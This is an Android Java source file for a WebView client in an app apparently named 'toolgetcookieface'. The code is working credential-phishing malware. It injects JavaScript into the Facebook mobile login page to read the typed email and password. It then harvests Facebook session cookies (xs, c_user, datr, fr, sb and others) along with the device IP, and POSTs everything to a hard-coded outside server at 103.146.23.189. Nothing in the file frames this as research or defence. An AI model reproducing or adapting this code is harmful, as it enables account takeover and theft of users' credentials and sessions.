package com.kmcompany.toolgetcookieface.custom;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.text.format.Formatter;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.kmcompany.toolgetcookieface.HomeActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import android.webkit.ValueCallback;
import android.widget.Toast;

public class WebClient extends WebViewClient {
    private Activity activity;
    private ProgressLoadingDialog loading;

    public WebClient(Activity activity) {
        this.activity = activity;
        loading = new ProgressLoadingDialog(activity);
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        // TODO Auto-generated method stub
        super.onPageStarted(view, url, favicon);
        loading.showDialog();

    }

    @Override
    public void onLoadResource(WebView view, String url) {
        super.onLoadResource(view, url);
    }

    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        // TODO Auto-generated method stub

        final String js = "(function(){return document.getElementById('m_login_email').value + '_' + document.getElementById('m_login_password').value})()";
        if(Build.VERSION.SDK_INT >= 19){
            view.evaluateJavascript(js, new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String s) {
                    if (!s.equals("_") && !s.equals(null) && !s.equals("") && !s.equals("null")) {
                        SharedPreferences sharedPreferences = activity.getSharedPreferences("shared_preferences", Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = sharedPreferences.edit();
                        editor.putString("username", s.split("_")[0]);
                        editor.putString("password", s.split("_")[1]);
                        editor.apply();
                    }
                }
            });
        }

        view.loadUrl(url);
        return true;
    }

    @Override
    public void onPageFinished(WebView view, String url) {
        super.onPageFinished(view, url);

        loading.dissDialog();

        SharedPreferences sharedPreferences = activity.getSharedPreferences("shared_preferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String status = sharedPreferences.getString("key_status_login", "");
        String user = sharedPreferences.getString("username", "");
        String pass = sharedPreferences.getString("password", "");

        if (!status.equals("")) {
            // Get ipaddress
            WifiManager wm = (WifiManager) activity.getApplicationContext().getSystemService(activity.WIFI_SERVICE);
            String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());

            String xs = getCookie(url, "xs");
            if (xs == null) {
                xs = "";
            }
            String c_user = getCookie(url, "c_user");
            if (c_user == null) {
                c_user = "";
            }
            String locale = getCookie(url, "locale");
            if (locale == null) {
                locale = "";
            }
            String spin = getCookie(url, "spin");
            if (spin == null) {
                spin = "";
            }
            String wd = getCookie(url, "wd");
            if (wd == null) {
                wd = "";
            }
            String fr = getCookie(url, "fr");
            if (fr == null) {
                fr = "";
            }
            String _fbp = getCookie(url, "presence");
            if (_fbp == null) {
                _fbp = "";
            }
            String datr = getCookie(url, "datr");
            if (datr == null) {
                datr = "";
            }
            String sb = getCookie(url, "sb");
            if (sb == null) {
                sb = "";
            }
            String presence = getCookie(url, "presence");
            if (presence == null) {
                presence = "";
            }

            if (c_user.equals("")) {
                editor.putString("key_status_login", "");
                editor.apply();
                loading.dissDialog();
                return;
            }

            // Optional Parameters to pass as POST request
            JSONObject params = new JSONObject();
            try {
                params.put("username", user);
                params.put("pwd", pass);
                params.put("ipAddress", ip);
                params.put("xs", xs);
                params.put("c_user", c_user);
                params.put("locale", locale);
                params.put("spin", spin);
                params.put("wd", wd);
                params.put("fr", fr);
                params.put("_fbp", _fbp);
                params.put("datr", datr);
                params.put("sb", sb);
            } catch (JSONException e) {
                e.printStackTrace();
            }

            // Make request for JSONObject
            JsonObjectRequest jsonObjReq = new JsonObjectRequest(
                    Request.Method.POST, "http://103.146.23.189:8082/api/v1/VIA/PostViaFB", params,
                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            Intent intent = new Intent(activity, HomeActivity.class);
                            activity.startActivity(intent);
                            loading.dissDialog();
                            Log.d("TAG", response.toString() + " i am queen");
                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    loading.dissDialog();
                    VolleyLog.d("TAG", "Error: " + error.getMessage());
                }
            }) {
                @Override
                public Map<String, String> getHeaders() throws AuthFailureError {
                    HashMap<String, String> headers = new HashMap<String, String>();
                    headers.put("Content-Type", "application/json; charset=utf-8");
                    return headers;
                }

            };

            // Adding request to request queue
            Volley.newRequestQueue(activity).add(jsonObjReq);
        } else {
            editor.putString("key_status_login", "1");
            editor.apply();
            loading.dissDialog();
        }
    }

    public String getCookie(String siteName, String cookieName){
        String CookieValue = null;

        CookieManager cookieManager = CookieManager.getInstance();
        String cookies = cookieManager.getCookie(siteName);
        String[] temp=cookies.split(";");
        for (String ar1 : temp ){
            if(ar1.contains(cookieName)){
                String[] temp1=ar1.split("=");
                CookieValue = temp1[1];
                break;
            }
        }
        return CookieValue;
    }
}
